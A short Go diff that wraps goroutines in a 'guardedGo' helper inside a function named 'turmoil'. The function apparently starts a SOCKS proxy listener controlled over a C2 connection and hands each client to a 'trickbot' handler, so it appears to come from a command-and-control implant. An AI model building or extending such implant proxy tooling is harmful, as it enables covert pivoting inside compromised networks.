@@ -114,7 +114,7 @@ func turmoil(port string, c2Conn net.Conn) error {
 	lazarusActive = true
 	lazarusStopCh = make(chan struct{})
 	atomic.StoreInt32(&lazarusCount, 0)
-	go func() {
+	guardedGo("socks-accept", func() {
 		for {
 			conn, err := listener.Accept()
 			if err != nil {
@@ -130,12 +130,13 @@ func turmoil(port string, c2Conn net.Conn) error {
 				continue
 			}
 			atomic.AddInt32(&lazarusCount, 1)
-			go func(c net.Conn) {
+			c := conn
+			guardedGo("socks-client", func() {
 				defer atomic.AddInt32(&lazarusCount, -1)
 				trickbot(c)
-			}(conn)
+			})
 		}
-	}()
+	})
 	return nil
 }
 
